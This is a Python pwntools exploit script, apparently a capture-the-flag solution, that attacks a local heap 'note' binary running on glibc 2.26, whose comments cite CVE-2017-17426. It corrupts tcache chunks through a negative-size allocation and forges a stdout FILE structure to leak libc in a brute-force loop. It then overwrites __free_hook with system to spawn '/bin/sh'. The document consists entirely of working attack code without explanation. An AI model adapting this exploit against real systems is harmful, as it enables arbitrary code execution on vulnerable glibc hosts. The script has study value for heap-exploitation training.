from pwn import *
from IO_FILE import *

###Util
def create(size,data):
    r.sendlineafter('choice : ','1')
    r.sendlineafter('size : ',str(size))
    r.sendafter('Note : ',data)

def delete(idx):
    r.sendlineafter('choice : ','2')
    r.sendlineafter('idx : ',str(idx))

###Addr
#  glibc2.26(The one succeptible to CVE-2017-17426)
#    namely glibc-2.26-0ubuntu1 ~ glibc-2.26-0ubuntu2
#    glibc-2.26-0ubuntu2.1 fixed the bug
stdout_struct_offset = 0x3db720
free_hook_offset = 0x3dc8a8
system_offset = 0x47dc0

###Explit
while True:
    r = process('./O',env={'LD_PRELOAD':'/tmp2/b05902008/Oldnote/libc-2.26.so'})

    create(0x18,'M30W')
    delete(0)
    for i in range(2):
        create(0x28,'M30W')
    for i in range(1,-1,-1):
        delete(i)
    create(0x38,'M30W')
    create(-1,b'\x00'*0x18+p64(0x41)+b'\xe0')
    delete(1)
    create(0x28,'M30W')
    delete(1)
    for i in range(2):
        create(0xf8,'M30W')
    create(-1,b'\x00'*0xb8+p64(0x41)+b'\x00'*0xf8+p64(0x41))
    delete(3)
    for i in range(1,3):
        delete(i)
    for i in range(3):
        create(0xf8,'M30W')
    for i in range(1,4):
        delete(i)
    create(-1,b'\x00'*0x78+p64(0x41)+b'\x00'*0x38+p64(0x21))
    delete(1)
    create(0x28,'M30W')
    delete(1)
    create(-1,b'\x00'*0x78+p64(0x441))
    delete(1)
    delete(0)
    create(-1,b'\x00'*0x78+p64(0x41)+p16((stdout_struct_offset+0x8000)&0xffff))
    delete(0)
    create(0x38,'M30W')

    try:
        IO_file = IO_FILE_plus(arch=64)
        stream = IO_file.construct(flags=0xfbad3887,
                                   write_base=stdout_struct_offset&0xff)
        create(0x38,stream[:0x21])
        stdout_struct_addr = u64(r.recv(0x28)[-8:])
        libc_base = stdout_struct_addr-stdout_struct_offset
        if libc_base&0xfff!=0:
            exit()
        print(hex(libc_base))
        break
    except:
        r.close()

create(-1,b'\x00'*0x78+p64(0x101)+b'\x00'*0xf8+p64(0x21))
delete(0)
delete(2)
create(-1,b'\x00'*0x78+p64(0x101)+p64(libc_base+free_hook_offset-0x8))
create(0xf8,'M30W')
create(0xf8,b'/bin/sh\x00'+p64(libc_base+system_offset))

delete(3)
r.interactive()
